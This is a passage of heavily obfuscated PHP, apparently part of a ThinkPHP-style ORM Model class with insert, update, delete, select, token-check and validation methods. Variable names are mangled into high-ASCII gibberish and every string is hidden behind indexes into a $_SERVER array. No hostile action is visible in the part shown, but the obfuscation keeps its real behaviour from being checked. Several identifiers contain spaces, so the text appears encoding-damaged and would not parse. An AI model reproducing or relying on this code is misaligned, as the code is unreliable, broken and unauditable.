ucwords(strtolower($Ş·ö„Ø)) . $ÍÀØêÒÍ[330]; if (!class_exists($Æô˜Ó±é)) { think_exception($Æô˜Ó±é . think_lang($ÍÀØêÒÍ[331])); } $this->_extModel = new $Æô˜Ó±é($this->name); if (!empty($ìÃŸ†—€)) { foreach ($ìÃŸ†—€ as $ßêæŒÇ) { $this->_extModel->setProperty($ßêæŒÇ, $this->{$ßêæŒÇ}); } } return $this->_extModel; } public function __set($ÎÜŞôÒ, $œ»×ù„è) { $this->data[$ÎÜŞôÒ] = $œ»×ù„è; } public function __get($ø³¸ì‰É) { return isset($this->data[$ø³¸ì‰É]) ? $this->data[$ø³¸ì‰É] : null; } public function __isset($ÀÙ½ª–À) { return isset($this->data[$ÀÙ½ª–À]); } public function __unset($„øÂïÉø) { unset($this->data[$„øÂïÉø]); } public function __call($ÓãÇ¢ı¡, $£›ó´÷ß) { $ë¾ğÙ‘£ =& $_SERVER[ìïæ“œî]; if (in_array(strtolower($ÓãÇ¢ı¡), $this->methods, !0)) { $this->options[strtolower($ÓãÇ¢ı¡)] = $£›ó´÷ß[0]; return $this; } elseif (in_array(strtolower($ÓãÇ¢ı¡), array($ë¾ğÙ‘£[332], $ë¾ğÙ‘£[333], $ë¾ğÙ‘£[334], $ë¾ğÙ‘£[335], $ë¾ğÙ‘£[336]), !0)) { $ÙŸ€ ™ = isset($£›ó´÷ß[0]) ? $£›ó´÷ß[0] : $ë¾ğÙ‘£[220]; $ÙŸ€ ™ = $this->db->parseKey($ÙŸ€ ™); return $this->getField(strtoupper($ÓãÇ¢ı¡) . $ë¾ğÙ‘£[337] . $ÙŸ€ ™ . $ë¾ğÙ‘£[338] . $ÓãÇ¢ı¡, $ë¾ğÙ‘£[332]); } elseif (strtolower(substr($ÓãÇ¢ı¡, 0, 5)) == $ë¾ğÙ‘£[339]) { $ÙŸ€ ™ = think_parse_name(substr($ÓãÇ¢ı¡, 5)); $«„é¶Í¹[$ÙŸ€ ™] = $£›ó´÷ß[0]; return $this->where($«„é¶Í¹)->find(); } elseif (strtolower(substr($ÓãÇ¢ı¡, 0, 10)) == $ë¾ğÙ‘£[340]) { $ı¥Ò™¦­ = think_parse_name(substr($ÓãÇ¢ı¡, 10)); $«„é¶Í¹[$ı¥Ò™¦­] = $£›ó´÷ß[0]; return $this->where($«„é¶Í¹)->getField($£›ó´÷ß[1]); } elseif (isset($this->_scope[$ÓãÇ¢ı¡])) { return $this->scope($ÓãÇ¢ı¡, $£›ó´÷ß[0]); } elseif (method_exists($this, $ÓãÇ¢ı¡)) { array_unshift($£›ó´÷ß, $ÓãÇ¢ı¡); return call_user_func_array(array($this, $ë¾ğÙ‘£[341]), $£›ó´÷ß); } else { return call_user_func_array(array(parent, $ÓãÇ¢ı¡), $£›ó´÷ß); } } protected function call() { $íÃ²¬»² =& $_SERVER[ìïæ“œî]; $¤ã¢Ë¬ = func_get_args(); $Á„íúñ = array_shift($¤ã¢Ë¬); $ğÌ¬ºÁÊ = $Á„íúñ; if (is_array($Á„íúñ)) { $ğÌ¬ºÁÊ = $Á„íúñ[1]; $Á„íúñ = $Á„íúñ[0]; } $æ°ùàáè = count($¤ã¢Ë¬) - 1; if (isset($¤ã¢Ë¬[$æ°ùàáè]) && $¤ã¢Ë¬[$æ°ùàáè] === $Á„íúñ) { think_exception(__CLASS__ . $íÃ²¬»²[4] . $Á„íúñ . think_lang($íÃ²¬»²[342])); return; } $¤ã¢Ë¬[] = $Á„íúñ; if (method_exists($this, $íÃ²¬»²[343])) { $ƒ¿÷ŒìÅ = call_user_func_array(array($this, $íÃ²¬»²[344]), array($ğÌ¬ºÁÊ, $¤ã¢Ë¬)); if (!is_null($ƒ¿÷ŒìÅ) && $ƒ¿÷ŒìÅ !== !1) { return $ƒ¿÷ŒìÅ; } } $˜Ú©‰”‚ = call_user_func_array(array($this, $Á„íúñ), $¤ã¢Ë¬); if (method_exists($this, $íÃ²¬»²[345])) { $ƒ¿÷ŒìÅ = call_user_func_array(array($this, $íÃ²¬»²[346]), array($ğÌ¬ºÁÊ, $¤ã¢Ë¬, $˜Ú©‰”‚)); if ($ƒ¿÷ŒìÅ) { return $ƒ¿÷ŒìÅ; } } return $˜Ú©‰”‚; } protected function _initialize() { } protected function _facade($Í¸ğ©«ï) { $ø½Œó³Æ =& $_SERVER[ìïæ“œî]; if (!empty($this->fields)) { foreach ($Í¸ğ©«ï as $ä‘³ş“¹ => $¤×Ûæ÷Á) { if (is_array($this->fields) && !in_array($ä‘³ş“¹, $this->fields, !0)) { unset($Í¸ğ©«ï[$ä‘³ş“¹]); } elseif (is_scalar($¤×Ûæ÷Á)) { $this->_parseType($Í¸ğ©«ï, $ä‘³ş“¹); } } } if (!empty($this->options[$ø½Œó³Æ[347]])) { $Í¸ğ©«ï = array_map($this->options[$ø½Œó³Æ[347]], $Í¸ğ©«ï); unset($this->options[$ø½Œó³Æ[347]]); } $this->_beforeWrite($Í¸ğ©«ï); return $Í¸ğ©«ï; } protected function _beforeWrite(&$§¾µâŠË) { } public function add($ïƒÊ¨Ü— = '', $ğûÊÄÍ¡ = array(), $®õÂ¨ÄÊ = false) { if (empty($ïƒÊ¨Ü—)) { if (!empty($this->data)) { $ïƒÊ¨Ü— = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[ìïæ“œî][348]); return !1; } } $ğûÊÄÍ¡ = $this->_parseOptions($ğûÊÄÍ¡); $ïƒÊ¨Ü— = $this->_facade($ïƒÊ¨Ü—); if (!1 === $this->_beforeInsert($ïƒÊ¨Ü—, $ğûÊÄÍ¡)) { return !1; } $‚¾àìò÷ = $this->db->insert($ïƒÊ¨Ü—, $ğûÊÄÍ¡, $®õÂ¨ÄÊ); if (!1 !== $‚¾àìò÷) { $¯š–ó½€ = $this->getLastInsID(); if ($¯š–ó½€) { $ïƒÊ¨Ü—[$this->getPk()] = $¯š–ó½€; $this->_after_insert($ïƒÊ¨Ü—, $ğûÊÄÍ¡); return $¯š–ó½€; } $this->_after_insert($ïƒÊ¨Ü—, $ğûÊÄÍ¡); } return $‚¾àìò÷; } protected function _beforeInsert(&$¼ï‚ı³, $ÏŞ˜®¨É) { } protected function _after_insert($µ×¯È¾›, $î›ß‘ô) { } public function addAll($‚Æ°¾Õ, $ÎÒ”ÈŞ‰ = array(), $ê¤˜Ñå¤ = false) { $Öüï´ä“ =& $_SERVER[ìïæ“œî]; if (empty($‚Æ°¾Õ)) { $this->error = think_lang($Öüï´ä“[348]); return !1; } $ÎÒ”ÈŞ‰ = $this->_parseOptions($ÎÒ”ÈŞ‰); foreach ($‚Æ°¾Õ as $·ì¨øÔ => $íÛÔûÖ—) { $‚Æ°¾Õ[$·ì¨øÔ] = $this->_facade($íÛÔûÖ—); } if (method_exists($this->db, $Öüï´ä“[349])) { $ªåöÃÔ’ = $this->db->insertAll($‚Æ°¾Õ, $ÎÒ”ÈŞ‰, $ê¤˜Ñå¤); } else { $this->startTrans(); foreach ($‚Æ°¾Õ as $·ì¨øÔ => $íÛÔûÖ—) { $ªåöÃÔ’ = $this->db->insert($íÛÔûÖ—, $ÎÒ”ÈŞ‰, $ê¤˜Ñå¤); } $this->commit(); } if (!1 !== $ªåöÃÔ’) { $¢Íòöç— = $this->getLastInsID(); if ($¢Íòöç—) { return $¢Íòöç—; } } return $ªåöÃÔ’; } public function selectAdd($–‹îå„ = '', $òÆ…Èè§ = '', $ñº÷ŒÓï = array()) { $ÂŒ®¥À© =& $_SERVER[ìïæ“œî]; $ñº÷ŒÓï = $this->_parseOptions($ñº÷ŒÓï); if (!1 === ($Æğ‚®ä = $this->db->selectInsert($–‹îå„ ? $–‹îå„ : $ñº÷ŒÓï[$ÂŒ®¥À©[350]], $òÆ…Èè§ ? $òÆ…Èè§ : $this->getTableName(), $ñº÷ŒÓï))) { $this->error = think_lang($ÂŒ®¥À©[351]); return !1; } else { return $Æğ‚®ä; } } public function save($ƒ»õàßÁ = '', $Œ³ÉãäÉ = array()) { $ÜÁ´ñ²Ñ =& $_SERVER[ìïæ“œî]; if (empty($ƒ»õàßÁ)) { if (!empty($this->data)) { $ƒ»õàßÁ = $this->data; $this->data = array(); } else { $this->error = think_lang($ÜÁ´ñ²Ñ[348]); return !1; } } $ƒ»õàßÁ = $this->_facade($ƒ»õàßÁ); $Œ³ÉãäÉ = $this->_parseOptions($Œ³ÉãäÉ); $ÄÉãúÛ† = $this->getPk(); if (!isset($Œ³ÉãäÉ[$ÜÁ´ñ²Ñ[352]])) { if (isset($ƒ»õàßÁ[$ÄÉãúÛ†])) { $±¢¯×ùÆ[$ÄÉãúÛ†] = $ƒ»õàßÁ[$ÄÉãúÛ†]; $Œ³ÉãäÉ[$ÜÁ´ñ²Ñ[352]] = $±¢¯×ùÆ; unset($ƒ»õàßÁ[$ÄÉãúÛ†]); } else { $this->error = think_lang($ÜÁ´ñ²Ñ[351]); return !1; } } if (is_array($Œ³ÉãäÉ[$ÜÁ´ñ²Ñ[352]]) && isset($Œ³ÉãäÉ[$ÜÁ´ñ²Ñ[352]][$ÄÉãúÛ†])) { $µŒİ‰ = $Œ³ÉãäÉ[$ÜÁ´ñ²Ñ[352]][$ÄÉãúÛ†]; } if (!1 === $this->_beforeUpdate($ƒ»õàßÁ, $Œ³ÉãäÉ)) { return !1; } $ÆÅò£¸ï = $this->db->update($ƒ»õàßÁ, $Œ³ÉãäÉ); if (!1 !== $ÆÅò£¸ï) { if (isset($µŒİ‰)) { $ƒ»õàßÁ[$ÄÉãúÛ†] = $µŒİ‰; } $this->_afterUpdate($ƒ»õàßÁ, $Œ³ÉãäÉ); } return $ÆÅò£¸ï; } protected function _beforeUpdate(&$ÈÎšò¨½, $ÔÀİÁ¥×) { } protected function _afterUpdate($ı¨ñÆÛ­, $‹ü¿Öàß) { } public function delete($¶Å™¼¨ = array()) { $Ã·ÈÒŞŸ =& $_SERVER[ìïæ“œî]; if (empty($¶Å™¼¨) && empty($this->options[$Ã·ÈÒŞŸ[352]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $§ã¼é­ı = $this->getPk(); if (is_numeric($¶Å™¼¨) || is_string($¶Å™¼¨)) { if (strpos($¶Å™¼¨, $Ã·ÈÒŞŸ[50])) { $½Ä×§È—[$§ã¼é­ı] = array($Ã·ÈÒŞŸ[353], $¶Å™¼¨); } else { $½Ä×§È—[$§ã¼é­ı] = $¶Å™¼¨; } $this->options[$Ã·ÈÒŞŸ[352]] = $½Ä×§È—; } $¶Å™¼¨ = $this->_parseOptions(); if (is_array($¶Å™¼¨[$Ã·ÈÒŞŸ[352]]) && isset($¶Å™¼¨[$Ã·ÈÒŞŸ[352]][$§ã¼é­ı])) { $ê—ß¾‘Ø = $¶Å™¼¨[$Ã·ÈÒŞŸ[352]][$§ã¼é­ı]; } $ŒáÔÜ£ = $this->db->delete($¶Å™¼¨); if (!1 !== $ŒáÔÜ£) { $¦•›—†… = array(); if (isset($ê—ß¾‘Ø)) { $¦•›—†…[$§ã¼é­ı] = $ê—ß¾‘Ø; } $this->_after_delete($¦•›—†…, $¶Å™¼¨); } return $ŒáÔÜ£; } protected function _after_delete($ù’°´è‚, $¤èÅòèä) { } public function select($œ©ğì = array()) { $ŸèÕ÷÷š =& $_SERVER[ìïæ“œî]; if (is_string($œ©ğì) || is_numeric($œ©ğì)) { $«©„ùÁ = $this->getPk(); if (strpos($œ©ğì, $ŸèÕ÷÷š[50])) { $÷ñ¯ôµ¦[$«©„ùÁ] = array($ŸèÕ÷÷š[353], $œ©ğì); } else { $÷ñ¯ôµ¦[$«©„ùÁ] = $œ©ğì; } $this->options[$ŸèÕ÷÷š[352]] = $÷ñ¯ôµ¦; } elseif (!1 === $œ©ğì) { $œ©ğì = $this->_parseOptions(); return $ŸèÕ÷÷š[354] . $this->db->buildSelectSql($œ©ğì) . $ŸèÕ÷÷š[355]; } $œ©ğì = $this->_parseOptions(); $ß½Î¹…Ñ = $this->db->select($œ©ğì); if (!1 === $ß½Î¹…Ñ) { return !1; } if (empty($ß½Î¹…Ñ)) { return null; } $this->_afterSelect($ß½Î¹…Ñ, $œ©ğì); return $ß½Î¹…Ñ; } protected function _afterSelect(&$İ˜¨å«¬, $¥ÃÈÅ½Ë) { } public function buildSql($Œ˜ûŠÌÇ = array()) { $–î¤‰Œ =& $_SERVER[ìïæ“œî]; $Œ˜ûŠÌÇ = $this->_parseOptions($Œ˜ûŠÌÇ); return $–î¤‰Œ[354] . $this->db->buildSelectSql($Œ˜ûŠÌÇ) . $–î¤‰Œ[355]; } public function optionsValue($²ºçà™¯ = null) { if (is_null($²ºçà™¯)) { return $this->options; } elseif (is_array($²ºçà™¯)) { $this->options = array_merge($this->options, $²ºçà™¯); } } protected function _parseOptions($™‡Ğ© İ = array()) { $÷Äˆî’Ó =& $_SERVER[ìïæ“œî]; if (is_array($™‡Ğ© İ)) { $™‡Ğ© İ = array_merge($this->options, $™‡Ğ© İ); } $this->options = array(); if (!isset($™‡Ğ© İ[$÷Äˆî’Ó[356]])) { $™‡Ğ© İ[$÷Äˆî’Ó[356]] = $this->getTableName(); $Õ™’—ş“ = $this->fields; } else { $Õ™’—ş“ = $this->getDbFields(); } if (!empty($™‡Ğ© İ[$÷Äˆî’Ó[357]])) { $™‡Ğ© İ[$÷Äˆî’Ó[356]] .= $÷Äˆî’Ó[53] . $™‡Ğ© İ[$÷Äˆî’Ó[357]]; } $™‡Ğ© İ[$÷Äˆî’Ó[358]] = $this->name; if (isset($™‡Ğ© İ[$÷Äˆî’Ó[352]]) && is_array($™‡Ğ© İ[$÷Äˆî’Ó[352]]) && !empty($Õ™’—ş“) && !isset($™‡Ğ© İ[$÷Äˆî’Ó[359]]) && !isset($™‡Ğ© İ[$÷Äˆî’Ó[356]])) { foreach ($™‡Ğ© İ[$÷Äˆî’Ó[352]] as $ˆçñ•ûî => $Ã‹ªÙ¿) { $ˆçñ•ûî = trim($ˆçñ•ûî); if (in_array($ˆçñ•ûî, $Õ™’—ş“, !0)) { if (is_scalar($Ã‹ªÙ¿)) { $this->_parseType($™‡Ğ© İ[$÷Äˆî’Ó[352]], $ˆçñ•ûî); } } elseif (!is_numeric($ˆçñ•ûî) && $÷Äˆî’Ó[11] != substr($ˆçñ•ûî, 0, 1) && !1 === strpos($ˆçñ•ûî, $÷Äˆî’Ó[10]) && !1 === strpos($ˆçñ•ûî, $÷Äˆî’Ó[337]) && !1 === strpos($ˆçñ•ûî, $÷Äˆî’Ó[214]) && !1 === strpos($ˆçñ•ûî, $÷Äˆî’Ó[360])) { unset($™‡Ğ© İ[$÷Äˆî’Ó[352]][$ˆçñ•ûî]); } } } $this->_options_filter($™‡Ğ© İ); return $™‡Ğ© İ; } protected function _options_filter(&$Ğñõ‚¼) { } protected function _parseType(&$´ä¡‡áş, $àÈ¹ÈŞë) { $â‹úÃ“™ =& $_SERVER[ìïæ“œî]; if (empty($this->options[$â‹úÃ“™[361]][$â‹úÃ“™[4] . $àÈ¹ÈŞë])) { $¹€çÕóà = strtolower($this->fields[$â‹úÃ“™[329]][$àÈ¹ÈŞë]); if (!1 !== strpos($¹€çÕóà, $â‹úÃ“™[362])) { } elseif (!1 === strpos($¹€çÕóà, $â‹úÃ“™[363]) && !1 !== strpos($¹€çÕóà, $â‹úÃ“™[364])) { $´ä¡‡áş[$àÈ¹ÈŞë] = intval($´ä¡‡áş[$àÈ¹ÈŞë]); } elseif (!1 !== strpos($¹€çÕóà, $â‹úÃ“™[365]) || !1 !== strpos($¹€çÕóà, $â‹úÃ“™[366])) { $´ä¡‡áş[$àÈ¹ÈŞë] = floatval($´ä¡‡áş[$àÈ¹ÈŞë]); } elseif (!1 !== strpos($¹€çÕóà, $â‹úÃ“™[367])) { $´ä¡‡áş[$àÈ¹ÈŞë] = (bool) $´ä¡‡áş[$àÈ¹ÈŞë]; } } } public function find($‹¾ù¿íè = array()) { $¥•‰ËŞ =& $_SERVER[ìïæ“œî]; if (is_numeric($‹¾ù¿íè) || is_string($‹¾ù¿íè)) { $ƒ‰ªş³·[$this->getPk()] = intval($‹¾ù¿íè); $this->options[$¥•‰ËŞ[352]] = $ƒ‰ªş³·; } $this->options[$¥•‰ËŞ[368]] = 1; $‹¾ù¿íè = $this->_parseOptions(); $³å¯ôœ  = $this->db->select($‹¾ù¿íè); if (!1 === $³å¯ôœ ) { return !1; } if (empty($³å¯ôœ )) { return null; } $this->data = $³å¯ôœ [0]; $this->_afterFind($this->data, $‹¾ù¿íè); if (!empty($this->options[$¥•‰ËŞ[369]])) { return $this->returnResult($this->data, $this->options[$¥•‰ËŞ[369]]); } return $this->data; } protected function _afterFind(&$Ÿ‹•’‰İ, $Œ•›¤Ù) { } protected function returnResult($¥³Ÿ¥ö¢, $’Û©Ö˜² = '') { $‹º½¯Õ£ =& $_SERVER[ìïæ“œî]; if ($’Û©Ö˜²) { if (is_callable($’Û©Ö˜²)) { return call_user_func($’Û©Ö˜², $¥³Ÿ¥ö¢); } switch (strtolower($’Û©Ö˜²)) { case $‹º½¯Õ£[370]: return json_encode($¥³Ÿ¥ö¢); case $‹º½¯Õ£[371]: return xml_encode($¥³Ÿ¥ö¢); } } return $¥³Ÿ¥ö¢; } public function parseFieldsMap($€ûªÏî, $ûòÍ´Ô¿ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $˜ÜÔ…‚› => $ÈĞìĞ…™) { if ($ûòÍ´Ô¿ == 1) { if (isset($€ûªÏî[$ÈĞìĞ…™])) { $€ûªÏî[$˜ÜÔ…‚›] = $€ûªÏî[$ÈĞìĞ…™]; unset($€ûªÏî[$ÈĞìĞ…™]); } } else { if (isset($€ûªÏî[$˜ÜÔ…‚›])) { $€ûªÏî[$ÈĞìĞ…™] = $€ûªÏî[$˜ÜÔ…‚›]; unset($€ûªÏî[$˜ÜÔ…‚›]); } } } } return $€ûªÏî; } public function setField($„ÌÂóÜ‰, $Ø³ŒÑê‹ = '') { if (is_array($„ÌÂóÜ‰)) { $£ı…ï»ñ = $„ÌÂóÜ‰; } else { $£ı…ï»ñ[$„ÌÂóÜ‰] = $Ø³ŒÑê‹; } return $this->save($£ı…ï»ñ); } public function setAdd($âÉ‘›¶Â, $àÏ¬’·» = 1) { $Áãºæ¥Í =& $_SERVER[ìïæ“œî]; $­áÖÕÏ = $âÉ‘›¶Â . $Áãºæ¥Í[372] . $àÏ¬’·»; if ($àÏ¬’·» < 0) { $­áÖÕÏ = $âÉ‘›¶Â . $àÏ¬’·»; } return $this->setField($âÉ‘›¶Â, array($Áãºæ¥Í[373], $­áÖÕÏ)); } public function getField($¼¯×æÅÃ, $ñˆî = null) { $®Ê†ùàÔ =& $_SERVER[ìïæ“œî]; $“®öÁ¯ƒ[$®Ê†ùàÔ[350]] = $¼¯×æÅÃ; $“®öÁ¯ƒ = $this->_parseOptions($“®öÁ¯ƒ); $¼¯×æÅÃ = trim($¼¯×æÅÃ); if (strpos($¼¯×æÅÃ, $®Ê†ùàÔ[50])) { if (!isset($“®öÁ¯ƒ[$®Ê†ùàÔ[368]])) { $“®öÁ¯ƒ[$®Ê†ùàÔ[368]] = is_numeric($ñˆî) ? $ñˆî : $®Ê†ùàÔ[12]; } $…è©®Çú = $this->db->select($“®öÁ¯ƒ); if (!empty($…è©®Çú)) { $£Â­‘ä = explode($®Ê†ùàÔ[50], $¼¯×æÅÃ); $¼¯×æÅÃ = array_keys($…è©®Çú[0]); $ıÂÀÆÄ = array_shift($¼¯×æÅÃ); $Ñ÷í«¢ı = array_shift($¼¯×æÅÃ); $ãó€Àïò = array(); $ÕŠœ‰¨Ï = count($£Â­‘ä); foreach ($…è©®Çú as $œ£ÈşöÚ) { $·ğÎ = $œ£ÈşöÚ[$ıÂÀÆÄ]; if (2 == $ÕŠœ‰¨Ï) { $ãó€Àïò[$·ğÎ] = $œ£ÈşöÚ[$Ñ÷í«¢ı]; } else { $ãó€Àïò[$·ğÎ] = is_string($ñˆî) ? implode($ñˆî, $œ£ÈşöÚ) : $œ£ÈşöÚ; } } return $ãó€Àïò; } } else { if (!0 !== $ñˆî) { $“®öÁ¯ƒ[$®Ê†ùàÔ[368]] = is_numeric($ñˆî) ? $ñˆî : 1; } if ($ñˆî === $®Ê†ùàÔ[332]) { unset($“®öÁ¯ƒ[$®Ê†ùàÔ[368]]); } $œ£ÈşöÚ = $this->db->select($“®öÁ¯ƒ); if (!empty($œ£ÈşöÚ)) { if ($ñˆî === $®Ê†ùàÔ[332]) { return reset($œ£ÈşöÚ[0]); } if (!0 !== $ñˆî && 1 == $“®öÁ¯ƒ[$®Ê†ùàÔ[368]]) { return reset($œ£ÈşöÚ[0]); } foreach ($œ£ÈşöÚ as $”˜ĞÂ‹¤) { $úŠÑùÖı[] = $”˜ĞÂ‹¤[$¼¯×æÅÃ]; } return $úŠÑùÖı; } } return null; } public function create($õå÷Å— = '', $¤áÃÑşø = '') { $¥Üú¦¬ =& $_SERVER[ìïæ“œî]; if (empty($õå÷Å—)) { $õå÷Å— = $_POST; } elseif (is_object($õå÷Å—)) { $õå÷Å— = get_object_vars($õå÷Å—); } if (empty($õå÷Å—) || !is_array($õå÷Å—)) { $this->error = think_lang($¥Üú¦¬[348]); return !1; } $õå÷Å— = $this->parseFieldsMap($õå÷Å—, 0); $¤áÃÑşø = $¤áÃÑşø ? $¤áÃÑşø : (!empty($õå÷Å—[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$¥Üú¦¬[350]])) { $•Â¸›äÖ = $this->options[$¥Üú¦¬[350]]; unset($this->options[$¥Üú¦¬[350]]); } elseif ($¤áÃÑşø == THINK_MODEL_INSERT && isset($this->insertFields)) { $•Â¸›äÖ = $this->insertFields; } elseif ($¤áÃÑşø == THINK_MODEL_UPDATE && isset($this->updateFields)) { $•Â¸›äÖ = $this->updateFields; } if (isset($•Â¸›äÖ)) { if (is_string($•Â¸›äÖ)) { $•Â¸›äÖ = explode($¥Üú¦¬[50], $•Â¸›äÖ); } if (think_config($¥Üú¦¬[374])) { $•Â¸›äÖ[] = think_config($¥Üú¦¬[375]); } foreach ($õå÷Å— as $¾¾ë¨„Æ => $Ò”àÅÀÚ) { if (!in_array($¾¾ë¨„Æ, $•Â¸›äÖ)) { unset($õå÷Å—[$¾¾ë¨„Æ]); } } } if (!$this->autoValidation($õå÷Å—, $¤áÃÑşø)) { return !1; } if (!$this->autoCheckToken($õå÷Å—)) { $this->error = think_lang($¥Üú¦¬[376]); return !1; } if ($this->autoCheckFields) { $•Â¸›äÖ = $this->getDbFields(); foreach ($õå÷Å— as $¾¾ë¨„Æ => $Ò”àÅÀÚ) { if (!in_array($¾¾ë¨„Æ, $•Â¸›äÖ)) { unset($õå÷Å—[$¾¾ë¨„Æ]); } elseif (MAGIC_QUOTES_GPC && is_string($Ò”àÅÀÚ)) { $õå÷Å—[$¾¾ë¨„Æ] = stripslashes($Ò”àÅÀÚ); } } } $this->autoOperation($õå÷Å—, $¤áÃÑşø); $this->data = $õå÷Å—; return $õå÷Å—; } public function autoCheckToken($Öòõ‰©) { $Ã…ğè†Ğ =& $_SERVER[ìïæ“œî]; if (isset($this->options[$Ã…ğè†Ğ[377]]) && !$this->options[$Ã…ğè†Ğ[377]]) { return !0; } if (think_config($Ã…ğè†Ğ[374])) { $å¶¿÷éÇ = think_config($Ã…ğè†Ğ[375]); if (!isset($Öòõ‰©[$å¶¿÷éÇ]) || Session::get($å¶¿÷éÇ)) { return !1; } list($‡éï´àÏ, $Œ·ÊÅ‘ç) = explode($Ã…ğè†Ğ[11], $Öòõ‰©[$å¶¿÷éÇ]); if ($Œ·ÊÅ‘ç && Session::get($å¶¿÷éÇ . $Ã…ğè†Ğ[10] . $‡éï´àÏ) === $Œ·ÊÅ‘ç) { Session::remove($å¶¿÷éÇ . $Ã…ğè†Ğ[10] . $‡éï´àÏ); return !0; } if (think_config($Ã…ğè†Ğ[378])) { Session::remove($å¶¿÷éÇ . $Ã…ğè†Ğ[10] . $‡éï´àÏ); } return !1; } return !0; } public function regex($¹®æ¶¬ö, $ÏÅ—¼Å) { $ëÆÙÅ‹ =& $_SERVER[ìïæ“œî]; $ªü®ŸŠÅ = array($ëÆÙÅ‹[379] => $ëÆÙÅ‹[380], $ëÆÙÅ‹[381] => $ëÆÙÅ‹[382], $ëÆÙÅ‹[383] => $ëÆÙÅ‹[384], $ëÆÙÅ‹[385] => $ëÆÙÅ‹[386], $ëÆÙÅ‹[387] => $ëÆÙÅ‹[388], $ëÆÙÅ‹[389] => $ëÆÙÅ‹[390], $ëÆÙÅ‹[391] => $ëÆÙÅ‹[392], $ëÆÙÅ‹[366] => $ëÆÙÅ‹[393], $ëÆÙÅ‹[394] => $ëÆÙÅ‹[395]); if (isset($ªü®ŸŠÅ[strtolower($ÏÅ—¼Å)])) { $ÏÅ—¼Å = $ªü®ŸŠÅ[strtolower($ÏÅ—¼Å)]; } return preg_match($ÏÅ—¼Å, $¹®æ¶¬ö) === 1; } private function autoOperation(&$¶Ã‘Œãà, $–òü‚ë¶) { $óÚë«Ú‰ =& $_SERVER[ìïæ“œî]; if (!empty($this->options[$óÚë«Ú‰[396]])) { $Òîæ·¥ = $this->options[$óÚë«Ú‰[396]]; unset($this->options[$óÚë«Ú‰[396]]); } elseif (!empty($this->_auto)) { $Òîæ·¥ = $this->_auto; } if (isset($Òîæ·¥)) { foreach ($Òîæ·¥ as $ÍùÚÉ”ª) { if (empty($ÍùÚÉ”ª[2])) { $ÍùÚÉ”ª[2] = THINK_MODEL_INSERT; } if ($–òü‚ë¶ == $ÍùÚÉ”ª[2] || $ÍùÚÉ”ª[2] == THINK_MODEL_BOTH) { switch (trim($ÍùÚÉ”ª[3])) { case $óÚë«Ú‰[397]: case $óÚë«Ú‰[398]: $ûıöõ©Ü = isset($ÍùÚÉ”ª[4]) ? (array) $ÍùÚÉ”ª[4] : array(); if (isset($¶Ã‘Œãà[$ÍùÚÉ”ª[0]])) { array_unshift($ûıöõ©Ü, $¶Ã‘Œãà[$ÍùÚÉ”ª[0]]); } if ($óÚë«Ú‰[397] == $ÍùÚÉ”ª[3]) { $¶Ã‘Œãà[$ÍùÚÉ”ª[0]] = call_user_func_array($ÍùÚÉ”ª[1], $ûıöõ©Ü); } else { $¶Ã‘Œãà[$ÍùÚÉ”ª[0]] = call_user_func_array(array(&$this, $ÍùÚÉ”ª[1]), $ûıöõ©Ü); } break; case $óÚë«Ú‰[350]: $¶Ã‘Œãà[$ÍùÚÉ”ª[0]] = $¶Ã‘Œãà[$ÍùÚÉ”ª[1]]; break; case $óÚë«Ú‰[399]: if ($óÚë«Ú‰[12] === $¶Ã‘Œãà[$ÍùÚÉ”ª[0]]) { unset($¶Ã‘Œãà[$ÍùÚÉ”ª[0]]); } break; case $óÚë«Ú‰[400]: default: $¶Ã‘Œãà[$ÍùÚÉ”ª[0]] = $ÍùÚÉ”ª[1]; } if (!1 === $¶Ã‘Œãà[$ÍùÚÉ”ª[0]]) { unset($¶Ã‘Œãà[$ÍùÚÉ”ª[0]]); } } } } return $¶Ã‘Œãà; } protected function autoValidation($áò¼îç¢, $ŒŸå¡ê·) { $ğäÏÈµí =& $_SERVER[ìïæ“œî]; if (!empty($this->options[$ğäÏÈµí[401]])) { $Î¼ÓœÔĞ = $this->options[$ğäÏÈµí[401]]; unset($this->options[$ğäÏÈµí[401]]); } elseif (!empty($this->_validate)) { $Î¼ÓœÔĞ = $this->_validate; } if (isset($Î¼ÓœÔĞ)) { if ($this->patchValidate) { $this->error = array(); } foreach ($Î¼ÓœÔĞ as $â—Çˆ¤ => $ß÷à—øç) { if (empty($ß÷à—øç[5]) || $ß÷à—øç[5] == THINK_MODEL_BOTH || $ß÷à—øç[5] == $ŒŸå¡ê·) { if (0 == strpos($ß÷à—øç[2], $ğäÏÈµí[402]) && strpos($ß÷à—øç[2], $ğäÏÈµí[403])) { $ß÷à—øç[2] = think_lang(substr($ß÷à—øç[2], 2, -1)); } $ß÷à—øç[3] = isset($ß÷à—øç[3]) ? $ß÷à—øç[3] : THINK_EXISTS_VALIDATE; $ß÷à—øç[4] = isset($ß÷à—øç[4]) ? $ß÷à—øç[4] : $ğäÏÈµí[404]; switch ($ß÷à—øç[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($áò¼îç¢, $ß÷à—øç)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($ğäÏÈµí[12] != trim($áò¼îç¢[$ß÷à—øç[0]])) { if (!1 === $this->_validationField($áò¼îç¢, $ß÷à—øç)) { return !1; } } break; default: if (isset($áò¼îç¢[$ß÷à—øç[0]])) { if (!1 === $this->_validationField($áò¼îç¢, $ß÷à—øç)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($„ñåúÆî, $â¤Äí‡à) { if (!1 === $this->_validationFieldItem($„ñåúÆî, $â¤Äí‡à)) { if ($this->patchValidate) { $this->error[$â¤Äí‡à[0]] = $â¤Äí‡à[2]; } else { $this->error = $â¤Äí‡à[2]; return !1; } } return; } protected function _validationFieldItem($Û™Ñğ¿, $©Í’ «ö) { $µÖô¡¤ =& $_SERVER[ìïæ“œî]; switch (strtolower(trim($©Í’ «ö[4]))) { case $µÖô¡¤[397]: case $µÖô¡¤[398]: $¾¥ïÀá = isset($©Í’ «ö[6]) ? (array) $©Í’ «ö[6] : array(); if (is_string($©Í’ «ö[0]) && strpos($©Í’ «ö[0], $µÖô¡¤[50])) { $©Í’ «ö[0] = explode($µÖô¡¤[50], $©Í’ «ö[0]); } if (is_array($©Í’ «ö[0])) { foreach ($©Í’ «ö[0] as $‰¸‹Ü£ú) { $ÁÜ·õöÚ[$‰¸‹Ü£ú] = 